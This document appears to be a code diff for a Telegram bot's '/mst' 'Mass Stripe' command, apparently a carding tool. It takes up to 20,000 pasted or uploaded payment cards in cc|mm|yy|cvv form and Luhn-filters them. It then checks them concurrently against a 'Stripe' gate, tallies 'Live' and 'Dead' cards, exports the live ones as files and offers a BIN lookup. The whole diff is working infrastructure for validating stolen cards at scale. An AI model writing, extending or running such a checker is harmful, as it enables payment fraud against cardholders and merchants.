+    raw = ""
+    msg = update.message
+    if context.args:
+        raw += " ".join(context.args) + " "
+    if msg.reply_to_message:
+        rm = msg.reply_to_message
+        raw += (rm.text or rm.caption or "") + " "
 
-    document = message.document
-    if not document and message.reply_to_message and message.reply_to_message.document:
-        document = message.reply_to_message.document
-    if document:
-        if document.file_size > 2 * 1024 * 1024:
-            await message.reply("❌ File too large. Max 2MB."); return
+    doc = msg.document or (msg.reply_to_message.document if msg.reply_to_message else None)
+    if doc:
+        if doc.file_size > 3 * 1024 * 1024:
+            await msg.reply_text("❌ File too large (max 3 MB)."); return
         try:
-            file    = await bot.get_file(document.file_id)
-            byte_io = await bot.download_file(file.file_path)
-            raw_text += byte_io.read().decode('utf-8', errors='ignore')
+            f    = await doc.get_file()
+            data = await f.download_as_bytearray()
+            raw += data.decode("utf-8", errors="ignore")
         except Exception as e:
-            await message.reply(f"❌ Error reading file: {e}"); return
+            await msg.reply_text(f"❌ Error reading file: {e}"); return
 
-    if not raw_text.strip():
-        await message.reply("❌ <b>No cards found.</b>", parse_mode="HTML"); return
-
-    extracted_cards = extract_cards_from_text(raw_text)
-    if not extracted_cards:
-        await message.reply("❌ No valid card formats found."); return
-
-    valid_cards     = []
-    MAX_VALID_CARDS = 20000
-    for card_string in extracted_cards:
-        if len(valid_cards) >= MAX_VALID_CARDS: break
-        parts = card_string.split('|')
-        if len(parts) != 4: continue
-        cc, mm, yy, cvv = parts
-        if luhn_check(cc):
-            valid_cards.append((card_string, cc))
-
-    total_cards = len(valid_cards)
-    if total_cards == 0:
-        await message.reply("❌ No valid Luhn checked cards found."); return
-
-    current_credits = await asyncio.to_thread(get_user_credits, user_id)
-    if current_credits < total_cards:
-        await message.reply(
-            f"❌ <b>Insufficient Credits</b>\n\n"
-            f"You need <b>{total_cards}</b> credits.\n"
-            f"Your balance: <b>{current_credits}</b> credits.",
+    if not raw.strip():
+        await msg.reply_text(
+            f'<b>🛒 Mass Stripe — <code>/mst</code></b>\n──────────\n'
+            f'Reply to a <code>.txt</code> file or paste cards directly.\n'
+            f'Format: <code>cc|mm|yy|cvv</code> (one per line)',
             parse_mode="HTML"
-        )
-        return
+        ); return
 
-    asyncio.create_task(process_mass_check_background(message, bot, valid_cards, user))
+    cards = _parse_cards(raw)
+    if not cards:
+        await msg.reply_text("❌ No valid cards found (use <code>cc|mm|yy|cvv</code>).",
+                             parse_mode="HTML"); return
+    if len(cards) > 20000:
+        cards = cards[:20000]
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BACKGROUND PROCESSING
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    total    = len(cards)
+    sid      = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+    plan_eid = get_plan_emoji_id("ELITE")
+    ul       = _user_link(user)
+    dev_url  = f'<a href="{DEV_LINK}">{bot_name_from_config()}</a>'
 
-async def process_mass_check_background(message: types.Message, bot: Bot,
-                                         valid_cards: list, user_obj):
-    user_id     = user_obj.id
-    chat_id     = message.chat.id
-    total_cards = len(valid_cards)
-
-    session_id               = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
-    plan_name, plan_emoji_id = await get_user_plan_info(user_id)
-
-    user_link = build_user_link(user_obj)
-    dev_link  = '<a href="https://t.me/Batcardchk">Batamanchk</a>'
-
-    initial_text = (
+    init_text = (
         f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Stripe | 0$</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ 0/{total_cards}</b>\n'
+        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ 0/{total}</b>\n'
         f'<b>Live ➳ 0 <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
         f'<b>Dead ➳ 0 <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
         f'<b>Errors ➳ 0 <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
         f'<b>Time ➳ 0s</b>\n'
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
-        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
-        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_link} '
+        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ul} '
+        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
+        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_url} '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
     )
 
-    progress_msg = await message.reply(
-        initial_text, parse_mode="HTML",
-        reply_markup=get_result_buttons(session_id, is_running=True),
+    prog_msg = await msg.reply_text(
+        init_text, parse_mode="HTML",
+        reply_markup=_kb_running(sid, 0),
         disable_web_page_preview=True,
     )
 
-    MST_SESSIONS[session_id] = {
-        "status":           "CHECKING",
-        "chat_id":          chat_id,
-        "user_id":          user_id,
-        "msg_id":           progress_msg.message_id,
-        "user_msg_id":      message.message_id,
-        "total":            total_cards,
-        "checked":          0,
-        "live":             0,
-        "dead":             0,
-        "errors":           0,
-        "start_time":       time.time(),
-        "end_time":         None,
-        "tasks":            [],
-        "last_text":        "",
-        "last_update_time": 0,
-        "live_cards":       [],
-        "dead_cards":       [],
-        "error_cards":      [],
-        "user_obj":         user_obj,
-        "plan_name":        plan_name,
-        "plan_emoji_id":    plan_emoji_id,
+    MST_SESSIONS[sid] = {
+        "status":     "CHECKING",
+        "chat_id":    msg.chat.id,
+        "user_id":    uid,
+        "msg_id":     prog_msg.message_id,
+        "total":      total,
+        "checked":    0,
+        "live":       0,
+        "dead":       0,
+        "errors":     0,
+        "start_time": time.time(),
+        "end_time":   None,
+        "last_txt":   "",
+        "last_upd":   0,
+        "live_cards": [],
+        "dead_cards": [],
+        "error_cards":[],
+        "user_obj":   user,
+        "plan_name":  "ELITE",
+        "plan_eid":   plan_eid,
+        "completed_at": None,
     }
 
-    logging.info(f"🚀 [MST] Started session {session_id} - {total_cards} cards - User: {user_id}")
+    asyncio.create_task(_run_mass(bot, sid, cards))
 
-    task = asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))
-    MST_TASKS[session_id] = task
+def bot_name_from_config():
+    try: return BOT_NAME
+    except: return "Batamanchk"
 
-
-async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
-    sess = MST_SESSIONS.get(session_id)
-    if not sess:
-        logging.error(f"[MST] Session {session_id} not found at start!")
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# CALLBACK: download results
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def cb_mst_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    parts = query.data.split(":")   # mstr:<sid>:<type>
+    if len(parts) < 3:
         return
+    _, sid, rtype = parts[0], parts[1], parts[2]
+    sess = _sess(sid)
+    if not sess:
+        await query.answer("⚠️ Session not found.", show_alert=True); return
+    if query.from_user.id != sess.get("user_id"):
+        await query.answer("❌ Not your session.", show_alert=True); return
 
-    sem         = asyncio.Semaphore(MAX_CONCURRENT_CARDS)
-    total_cards = len(cards)
+    buf, fn, count = _result_file(sess, rtype)
+    if count == 0:
+        await query.answer(f"❌ No {rtype} cards yet.", show_alert=True); return
 
-    logging.info(f"[MST] Session {session_id}: Processing {total_cards} cards with concurrency={MAX_CONCURRENT_CARDS}")
-
-    async def worker(cc_formatted, cc_num):
-        if is_session_stopped(session_id): return
-        async with sem:
-            if is_session_stopped(session_id): return
-            try:
-                await process_single_card(
-                    session_id, cc_formatted, cc_num,
-                    sess.get('user_id', user_obj.id),
-                    bot, user_obj, plan_name
-                )
-            except asyncio.CancelledError:
-                logging.info(f"🛑 [MST] Task cancelled: {cc_formatted}")
-                raise
-            except Exception as e:
-                if not is_session_stopped(session_id):
-                    logging.error(f"[MST] Worker error for {cc_formatted}: {e}")
-                    s = MST_SESSIONS.get(session_id)
-                    if s:
-                        try:
-                            s['checked'] += 1
-                            s['errors']  += 1
-                            if s['checked'] % CARDS_PER_PROGRESS_UPDATE == 0:
-                                await update_progress_message(bot, session_id)
-                        except Exception:
-                            pass
-
-    tasks = []
-    for cc_formatted, cc_num in cards:
-        if is_session_stopped(session_id):
-            logging.info(f"🛑 [MST] Stopped creating tasks - {len(tasks)} created")
-            break
-        task = asyncio.create_task(worker(cc_formatted, cc_num))
-        tasks.append(task)
-        sess['tasks'].append(task)
-
-    logging.info(f"📋 [MST] {len(tasks)} tasks created for session {session_id}")
-
-    if tasks:
-        results   = await asyncio.gather(*tasks, return_exceptions=True)
-        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
-        errors    = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))
-        if cancelled: logging.info(f"🛑 [MST] {cancelled} tasks cancelled")
-        if errors:    logging.error(f"[MST] {errors} tasks failed with exceptions")
-
-    sess = MST_SESSIONS.get(session_id)
-    if sess:
-        sess['end_time'] = time.time()
-        if sess['status'] != "STOPPED":
-            sess['status'] = "FINISHED"
-        sess['last_text'] = ""
-        sess['tasks']     = []
-
-        MST_COMPLETED_SESSIONS[session_id] = {
-            'user_id':     sess.get('user_id'),
-            'chat_id':     sess.get('chat_id'),
-            'msg_id':      sess.get('msg_id'),
-            'user_msg_id': sess.get('user_msg_id'),
-            'total':       sess.get('total', 0),
-            'checked':     sess.get('checked', 0),
-            'live':        sess.get('live', 0),
-            'dead':        sess.get('dead', 0),
-            'errors':      sess.get('errors', 0),
-            'status':      sess.get('status'),
-            'end_time':    sess.get('end_time', time.time()),
-            'live_cards':  sess.get('live_cards', []),
-            'dead_cards':  sess.get('dead_cards', []),
-            'error_cards': sess.get('error_cards', []),
-            'user_obj':    sess.get('user_obj'),
-            'plan_name':   sess.get('plan_name', 'TRIAL'),
-            'completed_at': time.time()
-        }
-
-        try:
-            await update_progress_message(bot, session_id, force_update=True)
-        except Exception as e:
-            logging.error(f"[MST] Error updating final progress: {e}")
-
-        elapsed = sess['end_time'] - sess['start_time']
-        logging.info(
-            f"🏁 [MST] Session {session_id} {sess['status']} - "
-            f"L:{sess['live']} D:{sess['dead']} E:{sess['errors']} "
-            f"Checked:{sess['checked']}/{total_cards} Time:{int(elapsed)}s"
+    await query.answer("📦 Generating…")
+    try:
+        await context.bot.send_document(
+            chat_id=query.message.chat.id,
+            document=InputFile(buf, filename=fn),
+            caption=f"Gate ➳ Stripe | 0$\nType ➳ {rtype.capitalize()}\nTotal ➳ {count}",
+            parse_mode="HTML",
         )
-    else:
-        logging.error(f"[MST] Session {session_id} not found in finally block!")
-
-    MST_TASKS.pop(session_id, None)
-
+    except Exception as e:
+        logging.error(f"[MST] send_document error: {e}")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /bin COMMAND  — PTB handler exported to main.py
+# CALLBACK: stop session
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def cb_mst_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    sid   = query.data.split(":")[-1]   # msts:<sid>
+    sess  = MST_SESSIONS.get(sid)
+    if not sess:
+        await query.answer("ℹ️ Session already finished.", show_alert=True); return
+    if query.from_user.id != sess.get("user_id"):
+        await query.answer("❌ Not your session.", show_alert=True); return
+    if sess["status"] != "CHECKING":
+        await query.answer("ℹ️ Not running.", show_alert=True); return
 
-def get_bin_handler():
-    """Returns a PTB CommandHandler for /bin so main.py can register it."""
-    from telegram.ext import CommandHandler as PTBCommandHandler
-    from telegram     import Update
-    from telegram.ext import ContextTypes
+    sess["status"] = "STOPPED"
+    for t in MST_TASKS.get(sid, []):
+        if not t.done(): t.cancel()
+    await query.answer("🛑 Stopped.")
+    try:
+        await _update_progress(context.bot, sid, force=True)
+    except Exception:
+        pass
 
-    async def _cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not context.args:
-            await update.message.reply_text(
-                "<b>Usage:</b> <code>/bin 411111</code>",
-                parse_mode="HTML"
-            )
-            return
-        bin6 = context.args[0].strip()[:6]
-        if not bin6.isdigit() or len(bin6) < 6:
-            await update.message.reply_text(
-                "<b>Usage:</b> <code>/bin 411111</code> — provide 6 digits",
-                parse_mode="HTML"
-            )
-            return
-        msg = await update.message.reply_text(
-            f"<b>🔍 Looking up BIN <code>{bin6}</code>…</b>",
-            parse_mode="HTML"
-        )
-        try:
-            data = await get_bin_info(bin6)
-        except Exception as e:
-            await msg.edit_text(f"<b>❌ BIN lookup failed:</b> <code>{e}</code>", parse_mode="HTML")
-            return
-        if not data or data.get("error"):
-            await msg.edit_text(
-                f"<b>❌ No BIN data found for <code>{bin6}</code></b>",
-                parse_mode="HTML"
-            )
-            return
-        scheme  = data.get("scheme",  "N/A")
-        btype   = data.get("type",    "N/A")
-        bank    = data.get("bank",    "N/A")
-        country = data.get("country", "N/A")
-        flag    = data.get("country_emoji", "")
-        text = (
-            f"<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
-            f"<b>BIN ➳ <code>{bin6}</code></b>\n"
-            f"<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
-            f"<b>Scheme  ➳ {scheme}</b>\n"
-            f"<b>Type    ➳ {btype}</b>\n"
-            f"<b>Bank    ➳ {bank}</b>\n"
-            f"<b>Country ➳ {flag} {country}</b>\n"
-            f"<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
-            f"<b>⚡ ➳ <a href=\"https://t.me/Batcardchk\">Batamanchk</a></b>"
-        )
-        await msg.edit_text(text, parse_mode="HTML", disable_web_page_preview=True)
-
-    return PTBCommandHandler("bin", _cmd_bin)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# HANDLER EXPORTS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def get_mst_handlers():
+    return [
+        CommandHandler("mst",         cmd_mst),
+        CallbackQueryHandler(cb_mst_result, pattern=r"^mstr:"),
+        CallbackQueryHandler(cb_mst_stop,   pattern=r"^msts:"),
+    ]
